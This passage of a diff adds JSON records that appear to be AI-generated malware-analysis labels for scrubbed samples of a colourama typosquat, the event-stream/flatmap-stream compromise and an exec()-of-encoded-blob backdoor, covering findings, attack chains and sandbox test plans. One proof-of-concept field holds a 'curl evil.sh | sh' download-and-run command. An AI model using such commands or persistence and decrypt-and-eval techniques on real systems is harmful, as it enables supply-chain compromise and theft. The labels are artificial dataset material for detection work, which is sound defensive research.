+            "validated_by": null
+          },
+          {
+            "id": "F005",
+            "type": "malware_behavior",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Persistence via sitecustomize.py drop in site-packages",
+            "cwe": "CWE-912",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "Writes decoded payload to install_lib/sitecustomize.py. Python automatically imports sitecustomize at interpreter startup, so the payload runs on every future python invocation by any user of that interpreter. This is a well-known Python persistence technique.",
+            "data_flow": null,
+            "fix": "Delete sitecustomize.py from site-packages, reinstall Python or the venv, and monitor for any sitecustomize.py/usercustomize.py drops in CI and developer environments.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1546"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          }
+        ],
+        "behavior": {
+          "purpose": "Masquerades as a cross-platform ANSI color library ('colourama') but is a typosquat of 'colorama'. Its setuptools install hook decodes a base64 payload, writes it to site-packages/sitecustomize.py for persistence, and exec()'s it to start a Windows clipboard hijacker targeting BTC/ETH wallet address",
+          "risk_narrative": "Reproduces the 2018 colourama PyPI clipboard-hijacker supply-chain attack. Installation silently executes attacker code, establishes persistence via sitecustomize.py, and on Windows monitors the clipboard for cryptocurrency addresses. Declared package purpose (terminal colors) does not match observed install-time behavior. Scrubbed reproduction: no real wallet substitution or network egress, but structure and techniques (base64 blob, cmdclass exec, site-packages drop, ctypes clipboard polling, r",
+          "sensitivity": "critical",
+          "data_types": [
+            "clipboard_contents",
+            "cryptocurrency_wallet_addresses"
+          ],
+          "data_flows": [
+            {
+              "source": "hardcoded base64 blob _SITECUSTOMIZE_PAYLOAD",
+              "sink": "site-packages/sitecustomize.py + exec() in installer process",
+              "risk": "Persistent code execution on every Python interpreter start; immediate code execution at install time.",
+              "transforms": [
+                "base64_decode",
+                "file_write",
+                "python_exec"
+              ]
+            },
+            {
+              "source": "Windows clipboard (user32.GetClipboardData CF_TEXT)",
+              "sink": "stdout (scrubbed) / originally attacker-controlled wallet substitution",
+              "risk": "Cryptocurrency theft by substituting copied wallet addresses with attacker-controlled ones.",
+              "transforms": [
+                "ascii_decode",
+                "regex_match_btc_eth"
+              ]
+            }
+          ],
+          "trust_boundaries": null,
+          "declared_vs_actual": {
+            "has_declaration": true,
+            "declaration_source": "Module docstring and setup() description: 'Cross-platform coloured terminal output ... ANSI colour codes ... xterm-256 palette ...'",
+            "mismatch_severity": "critical",
+            "description": "Declared as a benign terminal-color helper, but the install hook drops a sitecustomize.py persistence payload and exec()s a clipboard-hijacker targeting cryptocurrency wallets. No color-handling code is actually shipped.",
+            "undeclared_capabilities": [
+              "install-time code execution",
+              "base64 payload decoding",
+              "sitecustomize.py persistence drop",
+              "Windows clipboard monitoring",
+              "cryptocurrency address substitution (scrubbed)"
+            ]
+          },
+          "exfiltration_risk": {
+            "external_network_calls": [],
+            "encoding_before_sending": "base64-encoded payload; original attack substituted clipboard text to exfiltrate value via user-initiated transactions.",
+            "data_in_logs": "Decoded payload prints 'would_substitute: <original> -> <attacker>' to stdout (scrubbed); the original attack performed silent clipboard write-back.",
+            "data_in_errors": null
+          },
+          "obfuscation_signals": {
+            "encoded_strings": [
+              "_SITECUSTOMIZE_PAYLOAD (base64 ~1KB blob decoding to a clipboard-hijacker script)"
+            ],
+            "dynamic_url_construction": false,
+            "conditional_behavior": null,
+            "comment_code_mismatch": "Module docstring advertises an ANSI color library; actual code is an installer-hook dropper.",
+            "hidden_instructions": null,
+            "fetches_remote_instructions": false
+          }
+        },
+        "attack_chains": [
+          {
+            "name": "PyPI typosquat -> install-hook exec -> sitecustomize persistence -> clipboard hijack",
+            "likelihood": "confirmed",
+            "entry_point": "Developer runs 'pip install colourama' (typo of colorama).",
+            "impact": "Arbitrary code execution at install time, persistent code execution on every Python start, theft of cryptocurrency via clipboard address substitution on Windows hosts.",
+            "steps": [
+              "Victim mistypes 'colorama' as 'colourama' and pip-installs the package.",
+              "setuptools invokes _PostInstall.run() as the install cmdclass.",
+              "Install hook base64-decodes _SITECUSTOMIZE_PAYLOAD.",
+              "Hook writes decoded script to install_lib/sitecustomize.py (persistence).",
+              "Hook exec()s the decoded script in-process (immediate execution).",
+              "On Windows, payload polls clipboard via ctypes user32/kernel32 and matches BTC/ETH regexes.",
+              "Original attack: payload substitutes clipboard text with attacker wallet address; victim pastes attacker address into a transaction."
+            ],
+            "mitre_attack": [
+              "T1195.002",
+              "T1059.006",
+              "T1140",
+              "T1546",
+              "T1115"
+            ],
+            "findings_used": [
+              "F001",
+              "F002",
+              "F003",
+              "F004",
+              "F005",
+              "F006"
+            ]
+          }
+        ],
+        "hypotheses": [
+          {
+            "id": "H001",
+            "finding_ref": "F001",
+            "type": "exploitability_test",
+            "description": "Verify that running `python setup.py install` (or pip install) triggers _PostInstall.run(), which writes sitecustomize.py into install_lib and exec()s the decoded payload.",
+            "test_approach": "In an isolated sandbox venv without network, run 'pip install .' on the package. Assert that <site-packages>/sitecustomize.py exists and its SHA matches the base64-decoded content; assert install-time stdout contains payload output.",
+            "suggested_payload": "pip install ./colourama_setup_dir && ls <venv>/lib/python*/site-packages/sitecustomize.py",
+            "environment_needs": [
+              "python3",
+              "pip",
+              "isolated venv",
+              "writable site-packages"
+            ],
+            "oracle_type": "file_access",
+            "estimated_complexity": "low",
+            "poc_feasible": true,
+            "test_steps": [
+              {
+                "step_number": 1,
+                "action": "Create a fresh venv and pip install the package from source.",
+                "expected_state": "Install completes with exit code 0.",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 2,
+                "action": "Check for <venv>/lib/python*/site-packages/sitecustomize.py.",
+                "expected_state": "File exists and contains decoded clipboard-polling code.",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 3,
+                "action": "Invoke a fresh python -c 'pass' in that venv (on non-Windows the payload raises SystemExit immediately).",
+                "expected_state": "sitecustomize is auto-imported at startup; payload runs.",
+                "depends_on_step": null
+              }
+            ],
+            "environment_complexity": "single_process",
+            "estimated_sandbox_time_sec": 30
+          },
+          {
+            "id": "H002",
+            "finding_ref": "F002",
+            "type": "exploitability_test",
+            "description": "Confirm decoded payload matches BTC/ETH address regexes against clipboard text and emits substitution output.",
+            "test_approach": "On a Windows sandbox, seed clipboard with a valid-looking BTC (bc1...) and ETH (0x...) address via ctypes, then import sitecustomize / run the decoded script for ~1s and capture stdout for 'would_substitute' lines.",
+            "suggested_payload": null,
+            "environment_needs": [
+              "windows",
+              "python3",
+              "ctypes"
+            ],
+            "oracle_type": "execution_output",
+            "estimated_complexity": "medium",
+            "poc_feasible": true,
+            "test_steps": [],
+            "environment_complexity": "multi_process",
+            "estimated_sandbox_time_sec": 60
+          }
+        ]
+      },
+      "verdict": {
+        "verdict_label": "critical_malicious",
+        "log_summary": "Scrubbed reproduction of the 2018 colourama PyPI typosquat: setup.py install hook base64-decodes and exec()s a Windows clipboard-hijacker, drops sitecustomize.py for persistence.",
+        "recommended_action": "delete_and_rotate_credentials",
+        "validation_status": "static_only"
+      }
+    },
+    "error": null,
+    "usage": {
+      "input_tokens": 16721,
+      "output_tokens": 6186,
+      "cost_usd": 0.7148
+    },
+    "prompt_shape": "enriched",
+    "preprocessing_summary": {
+      "was_decoded": false,
+      "decode_layers": 0,
+      "obfuscation_detected": true,
+      "techniques": [
+        "exec_chain"
+      ],
+      "decoded_blob_count": 0,
+      "failed_blob_count": 0,
+      "suspicion_score": 0.0,
+      "merged_len": 4945,
+      "raw_len": 4945,
+      "pre_pass_duration_ms": 0.3
+    },
+    "model": "claude-opus-4-7"
+  },
+  {
+    "file_hash": "47d670426503595178da8b66ae32679b32a604e4b17e4ce35519ae9fc44c1ff9",
+    "file_name": "05_event_stream_flatmap_compromise.js",
+    "classification": "malicious",
+    "stratum_assigned": "supply_chain_dependency_compromise",
+    "full_label": {
+      "triage": {
+        "file_type": "script",
+        "language": "javascript",
+        "framework": null,
+        "ecosystem": "npm",
+        "is_ai_component": false,
+        "priority_score": 5,
+        "scan_depth": "full",
+        "pass2_candidate": true,
+        "pass2_reason": "obfuscated_payload"
+      },
+      "extractions": {
+        "secrets": [],
+        "entities": {
+          "ips": [],
+          "domains": [],
+          "urls": [],
+          "cloud_resources": [],
+          "file_paths_referenced": [],
+          "other_indicators": [
+            {
+              "value": "event-stream@3.3.6 / flatmap-stream@0.1.1,0.1.2",
+              "indicator_type": "supply_chain_reference",
+              "context": "Known malicious npm package versions from 2018 incident",
+              "line": null,
+              "severity_hint": "critical"
+            },
+            {
+              "value": "example-target-pkg-a",
+              "indicator_type": "targeting_allowlist",
+              "context": "Victim package name in TARGETS array",
+              "line": 34,
+              "severity_hint": "high"
+            },
+            {
+              "value": "example-target-pkg-b",
+              "indicator_type": "targeting_allowlist",
+              "context": "Victim package name in TARGETS array",
+              "line": 35,
+              "severity_hint": "high"
+            }
+          ]
+        },
+        "capabilities": {
+          "tags": [
+            "dynamic_execution",
+            "crypto_operations",
+            "data_encoding",
+            "env_access",
+            "defense_evasion",
+            "code_generation"
+          ],
+          "dangerous_apis": [
+            "eval",
+            "crypto.createDecipheriv",
+            "Buffer.from(base64)"
+          ],
+          "network_calls": [],
+          "commands_executed": [],
+          "env_vars_accessed": [
+            {
+              "name": "NPM_PACKAGE_DESCRIPTION",
+              "sensitivity": "high",
+              "risk_category": "application"
+            },
+            {
+              "name": "npm_package_name",
+              "sensitivity": "medium",
+              "risk_category": "application"
+            }
+          ],
+          "crypto_operations": [
+            {
+              "operation": "SHA-256 hash of NPM_PACKAGE_DESCRIPTION env var",
+              "purpose": "Derive AES-256-CBC key gated on victim bundle identity"
+            },
+            {
+              "operation": "AES-256-CBC decryption of embedded base64 ciphertext",
+              "purpose": "Decrypt hidden payload that is then passed to eval()"
+            }
+          ],
+          "requires_elevated_privileges": false,
+          "modifies_system_state": false
+        },
+        "obfuscation": {
+          "detected": true,
+          "techniques": [
+            "base64",
+            "custom_encoding",
+            "eval_chain"
+          ],
+          "layers": 2,
+          "suspicion_score": 0.98,
+          "decoded_content_summary": "Base64 ciphertext decrypted via AES-256-CBC using env-derived key, then eval()'d. Scrubbed reproduction \u2014 decrypts to harmless log; structurally identical to event-stream/flatmap-stream 2018 wallet-stealer."
+        }
+      },
+      "analysis": {
+        "findings": [
+          {
+            "id": "F001",
+            "type": "malware_behavior",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Encrypted payload decrypted with env-derived key and passed to eval() (event-stream/flatmap-stream pattern)",
+            "cwe": "CWE-506",
+            "cvss_estimate": 9.8,
+            "code_snippet": {
+              "description": "AES-decrypt ciphertext with env-derived key then eval",
+              "lines": [
+                67,
+                79
+              ]
+            },
+            "explanation": "maybeActivate() reads NPM_PACKAGE_DESCRIPTION, SHA-256s it into an AES-256-CBC key, decrypts an embedded base64 ciphertext, and eval()s the plaintext. The key derivation means the payload only decrypts correctly on a specific victim bundle (environmental keying / targeted dormant payload), exactly matching the 2018 event-stream supply-chain compromise via flatmap-stream.",
+            "data_flow": "process.env.NPM_PACKAGE_DESCRIPTION \u2192 sha256 \u2192 AES-256-CBC key; base64 ciphertext e[0] + IV e[1] \u2192 crypto.createDecipheriv \u2192 plaintext raw \u2192 eval(raw). Gated on process.env.npm_package_name \u2208 TARGETS.",
+            "fix": "Remove maybeActivate() and the embedded ciphertext/IV constants entirely. A stream transform library must never decrypt-and-eval at import time. Do not publish this file; rotate any credentials exposed in bundles that included it.",
+            "proof_of_concept": "Install the package into a host whose package.json has name in TARGETS and description matching the attacker's known value; module load triggers decryption to attacker JS which executes under the host process's privileges.",
+            "mitre_attack": [
+              "T1027",
+              "T1140",
+              "T1059.007",
+              "T1195.002"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F002",
+            "type": "supply_chain_risk",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Hidden malicious logic inside otherwise-legitimate stream library (trojanized dependency)",
+            "cwe": "CWE-506",
+            "cvss_estimate": 9.6,
+            "code_snippet": null,
+            "explanation": "Module executes maybeActivate() as a side-effect of require() before exporting the legitimate FlatMap transform. A consumer adding this package as a transitive dependency cannot observe the hidden behavior from its declared API. This is the canonical trojanized-transitive-dependency pattern.",
+            "data_flow": null,
+            "fix": "Treat this file as malicious; do not include in any build. Audit lockfiles for flatmap-stream@0.1.1/0.1.2 and event-stream@3.3.6. Enforce `npm audit`, Socket/Snyk scanning, and disallow side-effectful module-load logic in dependencies.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1195.002",
+              "T1554"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F003",
+            "type": "code_injection",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Use of eval() on runtime-decrypted content",
+            "cwe": "CWE-95",
+            "cvss_estimate": null,
+            "code_snippet": {
+              "description": "eval of decrypted plaintext",
+              "lines": [
+                78,
+                78
+              ]
+            },
+            "explanation": "eval(raw) executes arbitrary JavaScript derived from attacker-controlled ciphertext. Even with the scrubbed benign payload, the mechanism is an unrestricted code-execution primitive at module load.",
+            "data_flow": null,
+            "fix": "Never use eval on decrypted/remote content. Remove eval usage and any dynamic code generation from the module.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1059.007"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F004",
+            "type": "malware_behavior",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Victim targeting via hard-coded package allowlist (dormant payload)",
+            "cwe": "CWE-506",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "TARGETS list + early return when process.env.npm_package_name doesn't match implements environmental keying so the payload stays dormant in non-victim installs, frustrating sandbox and scanner detection. Combined with env-derived AES key, wrong hosts get garbage plaintext and silently fail.",
+            "data_flow": null,
+            "fix": "Remove targeting list and maybeActivate(); reject any dependency exhibiting conditional-on-host behavior.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1480",
+              "T1497"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F005",
+            "type": "malware_behavior",
+            "severity": "medium",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Silent try/catch swallows all errors from decrypt+eval path",
+            "cwe": "CWE-703",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "The empty catch (_err) intentionally suppresses exceptions from the decrypt/eval chain so non-targeted hosts do not crash or log, aiding stealth and hindering incident response.",
+            "data_flow": null,
+            "fix": "Do not ship code that silently suppresses errors around dynamic execution. Remove the entire activation block.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1070"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          }
+        ],
+        "behavior": {
+          "purpose": "Claims to be a flatmap-style Node.js stream Transform (drop-in successor to event-stream.map). Actually also contains a dormant, victim-targeted encrypted payload that decrypts under env-derived AES-256-CBC and eval()s the result at module load.",
+          "risk_narrative": "Textbook trojanized-dependency pattern from the 2018 event-stream/flatmap-stream npm compromise: legitimate-looking stream API exported alongside hidden module-load side effect that AES-decrypts an embedded blob keyed on the victim bundle's description and eval()s it. Dormant on non-targeted hosts via TARGETS allowlist + silent error swallowing. Even as a scrubbed reproduction, the structural code-execution primitive is fully intact.",
+          "sensitivity": "critical",
+          "data_types": [
+            "environment_variables",
+            "embedded_ciphertext",
+            "npm_package_metadata"
+          ],
+          "data_flows": [
+            {
+              "source": "process.env.NPM_PACKAGE_DESCRIPTION",
+              "sink": "AES-256-CBC key via SHA-256",
+              "risk": "Env-based key derivation gates payload to specific victim bundle (environmental keying)",
+              "transforms": [
+                "sha256"
+              ]
+            },
+            {
+              "source": "Embedded base64 ciphertext `e[0]`",
+              "sink": "eval()",
+              "risk": "Attacker-controlled code executed in host process on targeted victims",
+              "transforms": [
+                "base64_decode",
+                "aes_256_cbc_decrypt"
+              ]
+            },
+            {
+              "source": "process.env.npm_package_name",
+              "sink": "TARGETS.indexOf gate",
+              "risk": "Dormant-payload targeting prevents detection in non-victim environments",
+              "transforms": []
+            }
+          ],
+          "trust_boundaries": null,
+          "declared_vs_actual": {
+            "has_declaration": true,
+            "declaration_source": "JSDoc @module/@description block claiming 'drop-in successor to event-stream's map'",
+            "mismatch_severity": "critical",
+            "description": "Declared as a pure stream transform utility. Actually performs crypto-gated decrypt-and-eval of an embedded payload at module load, conditional on host package identity. Undeclared behaviors constitute hidden malicious code.",
+            "undeclared_capabilities": [
+              "dynamic_execution_via_eval",
+              "aes_256_cbc_decrypt_of_embedded_ciphertext",
+              "env_var_harvesting",
+              "victim_targeting_allowlist",
+              "silent_error_suppression"
+            ]
+          },
+          "exfiltration_risk": {
+            "external_network_calls": [],
+            "encoding_before_sending": "AES-256-CBC + base64 used to hide the executable payload itself (the real 2018 payload exfiltrated wallet seeds \u2014 scrubbed here)",
+            "data_in_logs": null,
+            "data_in_errors": null
+          },
+          "obfuscation_signals": {
+            "encoded_strings": [
+              "base64 ciphertext e[0]",
+              "base64 IV e[1]"
+            ],
+            "dynamic_url_construction": false,
+            "conditional_behavior": "Payload only runs when process.env.npm_package_name is in hard-coded TARGETS list",
+            "comment_code_mismatch": "JSDoc advertises a benign stream transform; code also contains decrypt+eval activation routine",
+            "hidden_instructions": "AES-256-CBC encrypted JS blob decrypted with env-derived key then eval'd",
+            "fetches_remote_instructions": false
+          }
+        },
+        "attack_chains": [
+          {
+            "name": "Trojanized transitive dependency \u2192 targeted decrypt-and-eval RCE",
+            "likelihood": "confirmed",
+            "entry_point": "require('flatmap-stream') during host bundle build/run",
+            "impact": "Arbitrary code execution in the victim build/runtime under the host process's privileges; in the historical incident, cryptocurrency wallet seed exfiltration from Copay/BitPay bundles.",
+            "steps": [
+              "Attacker publishes/updates flatmap-stream with this file; legitimate maintainer of event-stream adds it as a dependency.",
+              "Downstream consumer installs a bundle that transitively pulls flatmap-stream.",
+              "On module load, maybeActivate() checks process.env.npm_package_name against TARGETS allowlist.",
+              "On a matching host, SHA-256(NPM_PACKAGE_DESCRIPTION) yields the correct AES-256-CBC key.",
+              "Embedded base64 ciphertext is decrypted to JavaScript source.",
+              "eval(raw) executes the attacker payload in the host process.",
+              "Non-victim installs fail decryption silently via try/catch, preserving dormancy."
+            ],
+            "mitre_attack": [
+              "T1195.002",
+              "T1027",
+              "T1140",
+              "T1480",
+              "T1059.007",
+              "T1070"
+            ],
+            "findings_used": [
+              "F001",
+              "F002",
+              "F003",
+              "F004",
+              "F005"
+            ]
+          }
+        ],
+        "hypotheses": [
+          {
+            "id": "H001",
+            "finding_ref": "F001",
+            "type": "exploitability_test",
+            "description": "Confirm that setting npm_package_name to a TARGETS entry and NPM_PACKAGE_DESCRIPTION to the correct victim string causes the embedded ciphertext to decrypt and be passed to eval().",
+            "test_approach": "Run the module under Node with npm_package_name='example-target-pkg-a'. Instrument global eval to capture the argument instead of executing. Iterate candidate NPM_PACKAGE_DESCRIPTION values (scrubbed reproduction ships a known one) and observe whether decipher.final() succeeds without PKCS#7 padding error.",
+            "suggested_payload": "env npm_package_name=example-target-pkg-a NPM_PACKAGE_DESCRIPTION=<scrub_key> node -e \"global.eval=s=>console.log('EVAL:',s);require('./05_event_stream_flatmap_compromise.js')\"",
+            "environment_needs": [
+              "node_runtime",
+              "ability_to_set_env_vars",
+              "eval_hook"
+            ],
+            "oracle_type": "execution_output",
+            "estimated_complexity": "low",
+            "poc_feasible": true,
+            "test_steps": [
+              {
+                "step_number": 1,
+                "action": "Monkeypatch global.eval to record input and no-op",
+                "expected_state": "eval calls intercepted",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 2,
+                "action": "Set env npm_package_name to 'example-target-pkg-a' and NPM_PACKAGE_DESCRIPTION to the scrub's known key string; require the module",
+                "expected_state": "maybeActivate runs, decipher.final() returns cleanly, recorded eval argument is valid JS",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 3,
+                "action": "Re-run with a mismatched description",
+                "expected_state": "Decrypt throws; caught silently; eval not invoked",
+                "depends_on_step": null
+              }
+            ],
+            "environment_complexity": "single_process",
+            "estimated_sandbox_time_sec": 30
+          },
+          {
+            "id": "H002",
+            "finding_ref": "F004",
+            "type": "reachability_test",
+            "description": "Verify that on non-targeted hosts the module is functionally a pure stream transform and produces no observable side effects.",
+            "test_approach": "Require the module with npm_package_name unset or set to a non-TARGETS value. Assert that decipher is never constructed and that the exported FlatMap works as a normal object-mode Transform.",
+            "suggested_payload": null,
+            "environment_needs": [
+              "node_runtime"
+            ],
+            "oracle_type": "deterministic",
+            "estimated_complexity": "low",
+            "poc_feasible": true,
+            "test_steps": [],
+            "environment_complexity": "single_process",
+            "estimated_sandbox_time_sec": 15
+          }
+        ]
+      },
+      "verdict": {
+        "verdict_label": "critical_malicious",
+        "log_summary": "Scrubbed but structurally intact reproduction of the 2018 event-stream/flatmap-stream supply-chain compromise: victim-targeted AES-decrypt-and-eval at module load inside a fake stream library.",
+        "recommended_action": "delete_and_rotate_credentials",
+        "validation_status": "static_only"
+      }
+    },
+    "error": null,
+    "usage": {
+      "input_tokens": 16236,
+      "output_tokens": 5681,
+      "cost_usd": 0.6696
+    },
+    "prompt_shape": "enriched",
+    "preprocessing_summary": {
+      "was_decoded": false,
+      "decode_layers": 0,
+      "obfuscation_detected": false,
+      "techniques": [],
+      "decoded_blob_count": 0,
+      "failed_blob_count": 0,
+      "suspicion_score": 0.0,
+      "merged_len": 5161,
+      "raw_len": 5161,
+      "pre_pass_duration_ms": 0.98
+    },
+    "model": "claude-opus-4-7"
+  },
+  {
+    "file_hash": "d942b5b6eac30a2226947ec90dab74f2cec4672eb36d693d253d7c115c865f42",
+    "file_name": "06_audit_log_compression.py",
+    "classification": "malicious",
+    "stratum_assigned": "obfuscation_zlib_in_b64",
+    "full_label": {
+      "triage": {
+        "file_type": "script",
+        "language": "python",
+        "framework": null,
+        "ecosystem": "pypi",
+        "is_ai_component": false,
+        "priority_score": 5,
+        "scan_depth": "full",
+        "pass2_candidate": true,
+        "pass2_reason": "obfuscated_payload"
+      },
+      "extractions": {
+        "secrets": [],
+        "entities": {
+          "ips": [],
+          "domains": [],
+          "urls": [],
+          "cloud_resources": [],
+          "file_paths_referenced": [],
+          "other_indicators": [
+            {
+              "value": "_REGRESSION_FIXTURE",
+              "indicator_type": "embedded_b64_zlib_payload",
+              "context": "base64+zlib blob executed via exec() in _regenerate_baseline",
+              "line": null,
+              "severity_hint": "high"
+            }
+          ]
+        },
+        "capabilities": {
+          "tags": [
+            "file_read",
+            "file_write",
+            "dynamic_execution",
+            "data_encoding",
+            "code_generation"
+          ],
+          "dangerous_apis": [
+            "exec",
+            "zlib.decompress",
+            "base64.b64decode"
+          ],
+          "network_calls": [],
+          "commands_executed": [],
+          "env_vars_accessed": [],
+          "crypto_operations": [
+            {
+              "operation": "sha256",
+              "purpose": "integrity checksum over audit payload"
+            },
+            {
+              "operation": "zlib compress/decompress",
+              "purpose": "record compression for cold storage"
+            },
+            {
+              "operation": "base64 encode/decode",
+              "purpose": "text-safe transport of compressed bytes"
+            }
+          ],
+          "requires_elevated_privileges": false,
+          "modifies_system_state": true
+        },
+        "obfuscation": {
+          "detected": true,
+          "techniques": [
+            "base64",
+            "zlib_compress",
+            "exec_chain"
+          ],
+          "layers": 2,
+          "suspicion_score": 0.9,
+          "decoded_content_summary": "Embedded multi-line base64 blob decompressed with zlib and passed directly to exec(). Content not statically analyzable without decoding; framed as 'serialized test harness' but is arbitrary executable Python."
+        }
+      },
+      "analysis": {
+        "findings": [
+          {
+            "id": "F001",
+            "type": "code_injection",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Arbitrary code execution via exec() of embedded base64+zlib blob",
+            "cwe": "CWE-94",
+            "cvss_estimate": 9.3,
+            "code_snippet": {
+              "description": "exec of zlib+base64 decoded blob",
+              "lines": [
+                155,
+                160
+              ]
+            },
+            "explanation": "_regenerate_baseline() decodes a hardcoded base64 string, zlib-decompresses it, and passes the result directly to exec(). The docstring frames this as a 'serialized Python test harness' kept compressed to save source-control space, but the construct is a classic obfuscated-payload pattern: the reviewer cannot see what runs without decoding the blob. A malicious PR can swap the fixture literal to run any code (credential theft, backdoor install) while review diff looks like an opaque base64 chang",
+            "data_flow": "_REGRESSION_FIXTURE literal -> base64.b64decode -> zlib.decompress -> exec() in module globals. Attacker-controlled modification of the fixture (via PR, supply-chain compromise, or dependency pin swap) results in arbitrary code execution at CLI invocation time.",
+            "fix": "Remove exec() entirely. Ship the regression baseline as a plain-text fixture file in tests/ under code review, or regenerate it from real inputs through compress_record()/decompress_record(). Never exec() decoded blobs. If a compiled baseline is truly required, load it as data (e.g. json.loads) rather than executing it.",
+            "proof_of_concept": "Replace _REGRESSION_FIXTURE with base64(zlib.compress(b\"import os; os.system('curl evil.sh | sh')\")) and invoke `python -m auditlog.compression --regenerate-baseline`.",
+            "mitre_attack": [
+              "T1027",
+              "T1059.006"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F002",
+            "type": "supply_chain_risk",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Opaque embedded payload bypasses normal code review",
+            "cwe": "CWE-506",
+            "cvss_estimate": 8.1,
+            "code_snippet": {
+              "description": "embedded base64/zlib fixture marked DO NOT modify",
+              "lines": [
+                132,
+                148
+              ]
+            },
+            "explanation": "A multi-line base64 literal labeled 'DO NOT modify' that is executed as Python is unreviewable. Even if the current contents are benign, the pattern establishes a review-bypass channel: future diffs to this constant will not surface the intent of the changed code. This is the exact shape of recent supply-chain backdoors (e.g. xz-style obfuscated test fixtures executed during build).",
+            "data_flow": null,
+            "fix": "Eliminate the embedded-and-executed fixture. Store test scaffolding as readable .py files in tests/, generate baselines from live data, and forbid exec() of any compile-time constant via lint rule (e.g. bandit B102, ruff S102).",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1195.002"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          }
+        ],
+        "behavior": {
+          "purpose": "Audit-log CSV compression utility: streams rows, SHA-256 checksums, zlib-compresses and base64-encodes each payload, enforces size caps, and writes a batched shard. Includes a CLI with a --regenerate-baseline path that exec()s an embedded compressed Python blob.",
+          "risk_narrative": "Core compression/checksum logic is defensively written (size caps, bomb guard via single-shot decompress with max_length, checksum verification). The serious risk is the _regenerate_baseline path: a hardcoded base64+zlib blob is exec()'d with no signature, no schema, and a 'do not modify' comment. This creates a reviewer-blind code execution sink reachable from the module's own CLI, and a ready-made supply-chain backdoor shape even if today's contents are benign.",
+          "sensitivity": "high",
+          "data_types": [
+            "audit_log_payloads",
+            "tenant_id",
+            "event_time",
+            "sha256_checksum"
+          ],
+          "data_flows": [
+            {
+              "source": "CSV row payload field",
+              "sink": "compressed base64 CSV output file",
+              "risk": "Benign for data path; size and checksum guards present.",
+              "transforms": [
+                "utf-8 encode",
+                "zlib.compress level=6",
+                "base64 encode",
+                "sha256 for checksum"
+              ]
+            },
+            {
+              "source": "_REGRESSION_FIXTURE string literal",
+              "sink": "exec() in module scope",
+              "risk": "Arbitrary Python execution; reviewer-blind payload channel.",
+              "transforms": [
+                "base64 decode",
+                "zlib decompress"
+              ]
+            }
+          ],
+          "trust_boundaries": null,
+          "declared_vs_actual": {
+            "has_declaration": true,
+            "declaration_source": "module docstring + _regenerate_baseline docstring",
+            "mismatch_severity": "high",
+            "description": "Module is declared as a CSV-to-compressed-shard audit utility. The regenerate-baseline helper is declared as 're-running a serialized test harness to keep the baseline fresh', but what it actually does is exec() arbitrary Python decoded from an opaque constant. Execution of unreviewable code is not disclosed as a capability of an audit-retention utility.",
+            "undeclared_capabilities": [
+              "dynamic_execution",
+              "code_generation"
+            ]
+          },
+          "exfiltration_risk": {
+            "external_network_calls": [],
+            "encoding_before_sending": null,
+            "data_in_logs": "tenant_id appears in warning logs on checksum failure (minor PII/attribution leak).",
+            "data_in_errors": null
+          },
+          "obfuscation_signals": {
+            "encoded_strings": [
+              "_REGRESSION_FIXTURE base64+zlib blob"
+            ],
+            "dynamic_url_construction": false,
+            "conditional_behavior": "exec path only reached when --regenerate-baseline CLI flag is passed.",
+            "comment_code_mismatch": "Comment calls it a 'serialized Python test harness' kept compressed 'to save space'; code actually performs exec() on the decoded bytes.",
+            "hidden_instructions": "Executable Python hidden inside a compressed base64 constant framed as a test fixture.",
+            "fetches_remote_instructions": false
+          }
+        },
+        "attack_chains": [
+          {
+            "name": "Supply-chain backdoor via regression-fixture exec",
+            "likelihood": "high",
+            "entry_point": "Modification of _REGRESSION_FIXTURE literal (malicious PR, compromised maintainer, dependency pin bump)",
+            "impact": "Arbitrary code execution on any host that runs `python -m auditlog.compression --regenerate-baseline`, including the 'audit.regression.refresh' nightly job referenced in the docstring.",
+            "steps": [
+              "Attacker crafts Python payload (e.g. exfil creds, install persistence).",
+              "Attacker zlib-compresses and base64-encodes the payload.",
+              "Attacker submits PR updating _REGRESSION_FIXTURE, citing a 'baseline refresh'.",
+              "PR merges because the constant is opaque and marked 'do not modify'.",
+              "Nightly audit.regression.refresh job runs --regenerate-baseline.",
+              "exec() runs attacker Python with whatever privileges the audit pipeline holds."
+            ],
+            "mitre_attack": [
+              "T1195.002",
+              "T1059.006",
+              "T1027"
+            ],
+            "findings_used": [
+              "F001",
+              "F002"
+            ]
+          }
+        ],
+        "hypotheses": [
+          {
+            "id": "H001",
+            "finding_ref": "F001",
+            "type": "exploitability_test",
